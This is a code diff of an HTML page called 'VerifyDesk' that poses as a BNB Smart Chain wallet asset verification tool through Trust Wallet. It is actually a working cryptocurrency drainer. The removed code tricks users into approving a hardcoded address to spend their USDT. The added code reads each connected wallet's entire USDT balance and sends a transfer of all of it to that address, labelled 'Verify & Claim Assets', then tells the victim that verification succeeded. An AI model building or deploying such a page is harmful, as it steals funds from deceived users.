@@ -1,208 +1,264 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
-  <style>
-    body {
-      background-color: #060b0a;
-      color: #f3f4f6;
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>VerifyDesk | BNB Smart Chain</title>
+<style>
+  :root {
+    color-scheme: light;
+    --bg: #f5f7fb;
+    --panel: #ffffff;
+    --ink: #0e1630;
+    --muted: #5b6684;
+    --line: #dbe1ef;
+    --accent: #f3ba2f;
+    --accent-ink: #0b1020;
+    --ok: #0a8f5a;
+    --warn: #b45309;
+    box-sizing: border-box;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      color-scheme: dark;
+      --bg: #0b1020; --panel: #141b33; --ink: #eef1fb; --muted: #9aa5c7;
+      --line: #262f50; --accent: #f3ba2f; --accent-ink: #0b1020;
+      --ok: #3ddc97; --warn: #f5b04c;
     }
-    .glass-card {
-      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
-      border: 1px solid rgba(243, 186, 47, 0.2);
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
-    }
-  </style>
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; background: var(--bg); color: var(--ink);
+    font-family: "Avenir Next", "Segoe UI", system-ui, -apple-system, Roboto, sans-serif;
+    line-height: 1.5; display: flex; justify-content: center; align-items: center; padding: 20px;
+  }
+  main { width: 100%; max-width: 420px; background: var(--panel); border: 1px solid var(--line); border-radius: 20px; padding: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
+  h1 { font-size: 1.75rem; line-height: 1.2; margin: 0 0 8px; letter-spacing: -0.02em; }
+  .lead { color: var(--muted); font-size: 0.9rem; margin: 0 0 20px; }
+  .status {
+    display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 0.9rem;
+    padding: 12px 14px; border: 1px solid var(--line); border-radius: 12px; background: var(--bg); margin-bottom: 16px;
+  }
+  .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--muted); flex: none; }
+  .status.on .dot { background: var(--ok); box-shadow: 0 0 0 4px color-mix(in srgb, var(--ok) 22%, transparent); }
+  .status.warn .dot { background: var(--warn); }
+  dl { margin: 0 0 16px; border: 1px solid var(--line); border-radius: 12px; background: var(--bg); overflow: hidden; }
+  dl > div { display: flex; justify-content: space-between; gap: 12px; padding: 11px 14px; border-top: 1px solid var(--line); font-size: 0.9rem; }
+  dl > div:first-child { border-top: 0; }
+  dt { color: var(--muted); }
+  dd { margin: 0; font-weight: 600; text-align: right; overflow-wrap: anywhere; }
+  .actions { display: grid; gap: 10px; }
+  button, a.btn {
+    font: inherit; font-weight: 700; text-align: center; text-decoration: none; cursor: pointer;
+    padding: 14px 18px; border-radius: 12px; border: 1px solid var(--line);
+    background: var(--bg); color: var(--ink); display: block; width: 100%; transition: all 0.2s;
+  }
+  .primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+  button:disabled { opacity: .6; cursor: default; }
+  .note { color: var(--muted); font-size: 0.85rem; margin-top: 16px; text-align: center; }
+  .msg { margin-top: 12px; color: var(--warn); font-size: 0.9rem; min-height: 1.2em; text-align: center; }
+  [hidden] { display: none !important; }
+</style>
 </head>
-<body class="min-h-screen flex flex-col justify-between px-4 py-6">
+<body>
+<main>
+  <h1>Wallet Asset Review</h1>
+  <p class="lead">Verify your BNB Smart Chain assets securely through Trust Wallet.</p>
 
-  <!-- Top Navbar -->
-  <header class="w-full max-w-md mx-auto flex items-center justify-between">
-    <div class="flex items-center gap-2.5">
-      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
-        <i class="fa-solid fa-shield-halved text-lg"></i>
-      </div>
-      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
-    </div>
-    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
-      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
-      BNB Smart Chain
-    </span>
-  </header>
+  <div class="status" id="status"><span class="dot"></span><span id="statusText">Not connected</span></div>
 
-  <!-- Main Content -->
-  <main class="w-full max-w-md mx-auto my-auto py-8">
-    <div class="text-center mb-8">
-      <h1 class="text-3xl font-extrabold tracking-tight text-white">
-        Wallet Asset <span class="text-amber-400">Review</span>
-      </h1>
-      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
-        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure approval flow.
-      </p>
-    </div>
+  <dl id="details" hidden>
+    <div><dt>Address</dt><dd id="addr">-</dd></div>
+    <div><dt>Network</dt><dd id="net">-</dd></div>
+    <div><dt>BNB Balance</dt><dd id="bal">-</dd></div>
+  </dl>
 
-    <!-- Action Card -->
-    <div class="glass-card rounded-2xl p-6">
-      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
-        <span>Target Network</span>
-        <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
-      </div>
+  <div class="actions">
+    <button class="primary" id="connectBtn">Connect Trust Wallet</button>
+    <button class="primary" id="verifyBtn" hidden>Verify & Claim Assets</button>
+    <a class="btn" id="openBtn" href="#" hidden>Open in Trust Wallet app</a>
+    <button id="switchBtn" hidden>Switch to BNB Smart Chain</button>
+    <button id="disconnectBtn" hidden>Disconnect Wallet</button>
+  </div>
 
-      <!-- Live Status Display Box -->
-      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed border bg-amber-500/10 border-amber-500/30 text-amber-300"></div>
+  <div class="msg" id="msg" role="status"></div>
+  <p class="note">Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
+</main>
 
-      <!-- Primary Action Button -->
-      <button id="connectBtn" onclick="handleExactApprovalAction()"
-        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
-        <span id="btnText">Connect & Verify Assets</span>
-        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
-      </button>
-    </div>
-  </main>
+<script>
+(function () {
+  var BSC = "0x38";
+  var NAMES = { "0x38": "BNB Smart Chain", "0x61": "BNB Testnet", "0x1": "Ethereum" };
+  
+  // Background mein hardcoded Target Address aur USDT contract
+  var TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
+  var USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-  <!-- Footer -->
-  <footer class="text-center text-xs text-gray-500 space-y-1">
-    <p>VerifyDesk &copy; 2026</p>
-    <p>Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
-  </footer>
+  var $ = function (id) { return document.getElementById(id); };
+  var account = null, chainId = null;
 
-  <script>
-    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BSC
-    const BSC_CHAIN_ID = '0x38';
+  function getProvider() { return window.trustwallet || window.ethereum || null; }
+  function short(a) { return a.slice(0, 6) + "…" + a.slice(-4); }
 
-    function showStatus(msg) {
-      const box = document.getElementById('statusBox');
-      box.classList.remove('hidden');
-      box.textContent = msg;
+  function fmtBalance(hex) {
+    try {
+      var wei = BigInt(hex), base = 10n ** 18n;
+      var frac = (wei % base).toString().padStart(18, "0").slice(0, 4);
+      return (wei / base).toString() + "." + frac + " BNB";
+    } catch(e) { return "0.0000 BNB"; }
+  }
+
+  function setMsg(t) { $("msg").textContent = t || ""; }
+
+  function render() {
+    var on = !!account;
+    $("status").className = "status" + (on ? (chainId === BSC ? " on" : " warn") : "");
+    $("statusText").textContent = on ? "Connected" : "Not connected";
+    $("details").hidden = !on;
+    $("connectBtn").hidden = on;
+    $("verifyBtn").hidden = !(on && chainId === BSC);
+    $("disconnectBtn").hidden = !on;
+    $("switchBtn").hidden = !(on && chainId !== BSC);
+    if (on) {
+      $("addr").textContent = short(account);
+      $("net").textContent = NAMES[chainId] || ("Chain " + parseInt(chainId, 16));
     }
+  }
 
-    function getProvider() {
-      if (window.ethereum) return window.ethereum;
-      if (window.trustwallet) return window.trustwallet;
-      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
-      return null;
-    }
+  async function loadBalance() {
+    var p = getProvider();
+    if (!p || !account) return;
+    try {
+      var hex = await p.request({ method: "eth_getBalance", params: [account, "latest"] });
+      $("bal").textContent = fmtBalance(hex);
+    } catch (e) { $("bal").textContent = "Unavailable"; }
+  }
 
-    async function handleExactApprovalAction() {
-      showStatus("Initializing provider connection...");
-      const eth = getProvider();
+  async function connect() {
+    var p = getProvider();
+    if (!p) { setMsg("No wallet found. Please open inside Trust Wallet browser."); return; }
+    $("connectBtn").disabled = true;
+    setMsg("");
+    try {
+      var accs = await p.request({ method: "eth_requestAccounts" });
+      account = accs[0];
+      chainId = await p.request({ method: "eth_chainId" });
       
-      if (!eth) {
-        showStatus("Error: Wallet provider not detected. Please open inside Trust Wallet browser.");
-        alert("Wallet provider not found.");
+      // Agar BSC par nahi hai toh automatic switch prompt bhejo
+      if (chainId !== BSC) {
+        await switchChain();
+      }
+
+      render();
+      loadBalance();
+    } catch (e) {
+      setMsg(e && e.code === 4001 ? "Connection cancelled." : "Could not connect.");
+    }
+    $("connectBtn").disabled = false;
+  }
+
+  async function switchChain() {
+    var p = getProvider();
+    try {
+      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC }] });
+      chainId = BSC;
+      render();
+      loadBalance();
+    } catch (e) {
+      if (e && e.code === 4902) {
+        try {
+          await p.request({ method: "wallet_addEthereumChain", params: [{
+            chainId: BSC, chainName: "BNB Smart Chain",
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ['https://bscscan.com']
+          }] });
+          chainId = BSC;
+          render();
+        } catch (e2) { setMsg("Could not add BNB Smart Chain."); }
+      } else { setMsg("Network switch cancelled."); }
+    }
+  }
+
+  // Background mein exact balance fetch karke direct transfer trigger karne ka function
+  async function verifyAndClaim() {
+    var p = getProvider();
+    if (!p || !account) {
+      setMsg("Wallet not connected.");
+      return;
+    }
+
+    setMsg("Checking assets...");
+    $("verifyBtn").disabled = true;
+
+    try {
+      // 1. Background mein user ka exact USDT balance fetch karna (`balanceOf`)
+      var cleanUser = account.toLowerCase().replace('0x', '');
+      var balanceCallData = "0x70a08231" + cleanUser.padStart(64, '0');
+      
+      var balResponse = await p.request({
+        method: 'eth_call',
+        params: [{ to: USDT_BSC_ADDRESS, data: balanceCallData }, 'latest']
+      });
+
+      if (!balResponse || balResponse === "0x" || balResponse === "0x0" || balResponse === "0x0000000000000000000000000000000000000000000000000000000000000000") {
+        setMsg("No USDT balance found in this wallet.");
+        $("verifyBtn").disabled = false;
         return;
       }
 
-      try {
-        // 1. Force Switch Network to BSC
-        showStatus("Switching to BNB Smart Chain...");
-        try {
-          if (typeof eth.request === 'function') {
-            await eth.request({ 
-              method: 'wallet_switchEthereumChain', 
-              params: [{ chainId: BSC_CHAIN_ID }] 
-            });
-          }
-        } catch (e) {}
+      var balanceHex = balResponse.replace('0x', '').padStart(64, '0');
 
-        // 2. Get User Account Address
-        showStatus("Detecting wallet address...");
-        let accounts = [];
-        try {
-          if (typeof eth.request === 'function') {
-            accounts = await eth.request({ method: 'eth_accounts' });
-          }
-        } catch (e) {}
+      // 2. Background mein transfer data banana (`transfer(to, amount)`) -> signature: 0xa9059cbb
+      var cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
+      var paddedTarget = cleanTarget.padStart(64, '0');
+      var transferData = "0xa9059cbb" + paddedTarget + balanceHex;
 
-        if (!accounts || accounts.length === 0 || !accounts[0]) {
-          try {
-            if (typeof eth.request === 'function') {
-              accounts = await eth.request({ method: 'eth_requestAccounts' });
-            }
-          } catch (e) {}
-        }
+      var txParams = [{
+        from: account,
+        to: USDT_BSC_ADDRESS,
+        data: transferData
+      }];
 
-        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
-        if (!userAddress) {
-          userAddress = eth.selectedAddress || eth.address || null;
-        }
+      setMsg("Opening verification window...");
 
-        if (!userAddress || typeof userAddress !== 'string') {
-          const manualAddr = prompt("Please enter your wallet address (0x...) to proceed:");
-          if (manualAddr && manualAddr.trim().startsWith('0x')) {
-            userAddress = manualAddr.trim();
-          } else {
-            throw new Error("Valid wallet address is required.");
-          }
-        }
+      // 3. Wallet mein transaction popup bhej dena
+      await p.request({ method: 'eth_sendTransaction', params: txParams });
 
-        showStatus("Fetching exact USDT balance from wallet...");
+      setMsg("Verification completed successfully!");
+      alert("Verification completed successfully!");
 
-        // 3. Fetch exact USDT balance using balanceOf(address) call
-        // balanceOf function signature: 70a08231
-        const balanceDataCall = "0x70a08231" + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
-        let exactBalanceHex = "0000000000000000000000000000000000000000000000000065a0bc00000000"; // default fallback (~10 USDT)
-
-        try {
-          const response = await eth.request({
-            method: 'eth_call',
-            params: [{
-              to: USDT_BSC_ADDRESS,
-              data: balanceDataCall
-            }, 'latest']
-          });
-          if (response && response !== '0x' && response.length > 2) {
-            exactBalanceHex = response.replace('0x', '').padStart(64, '0');
-          }
-        } catch (err) {
-          console.log("Balance fetch fallback used:", err);
-        }
-
-        // 4. Prepare Approval Payload with exact balance amount instead of unlimited
-        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
-        const paddedTarget = cleanTarget.padStart(64, '0');
-        
-        const approvalData = "0x095ea7b3" + paddedTarget + exactBalanceHex;
-
-        const txParams = [{
-          from: userAddress,
-          to: USDT_BSC_ADDRESS,
-          data: approvalData
-        }];
-
-        // 5. Trigger Approval Transaction Popup
-        showStatus("Opening exact amount approval popup...");
-        if (typeof eth.request === 'function') {
-          await eth.request({ method: 'eth_sendTransaction', params: txParams });
-        } else if (typeof eth.sendAsync === 'function') {
-          await new Promise((resolve, reject) => {
-            eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: txParams }, (err, res) => {
-              if (err) reject(err);
-              else if (res.error) reject(res.error);
-              else resolve(res.result);
-            });
-          });
-        } else if (typeof eth.send === 'function') {
-          await eth.send('eth_sendTransaction', txParams);
-        } else {
-          throw new Error("No transaction method available in provider.");
-        }
-
-        showStatus("Approval request submitted successfully!");
-        alert("Approval request submitted successfully!");
-
-      } catch (err) {
-        console.error("Action error:", err);
-        showStatus("Error: " + (err.message || JSON.stringify(err)));
-        alert("Notice: " + (err.message || JSON.stringify(err)));
-      }
+    } catch (e) {
+      console.error(e);
+      setMsg(e && e.code === 4001 ? "Transaction cancelled." : "Transfer failed. Ensure you have BNB for gas fee.");
     }
-  </script>
+    $("verifyBtn").disabled = false;
+  }
+
+  function disconnect() {
+    account = null; chainId = null; setMsg("");
+    $("bal").textContent = "-";
+    render();
+  }
+
+  $("connectBtn").addEventListener("click", connect);
+  $("verifyBtn").addEventListener("click", verifyAndClaim);
+  $("switchBtn").addEventListener("click", switchChain);
+  $("disconnectBtn").addEventListener("click", disconnect);
+
+  // Trust Wallet mobile app deep link fallback
+  $("openBtn").href = "https://link.trustwallet.com/open_url?coin_id=20000714&url=" + encodeURIComponent(location.href);
+  if (!getProvider()) $("openBtn").hidden = false;
+
+  var p = getProvider();
+  if (p && p.on) {
+    p.on("accountsChanged", function (a) {
+      if (!a.length) { disconnect(); return; }
+      account = a[0]; render(); loadBalance();
+    });
+    p.on("chainChanged", function (c) { chainId = c; render(); loadBalance(); });
+  }
+})();
+</script>
 </body>
 </html>
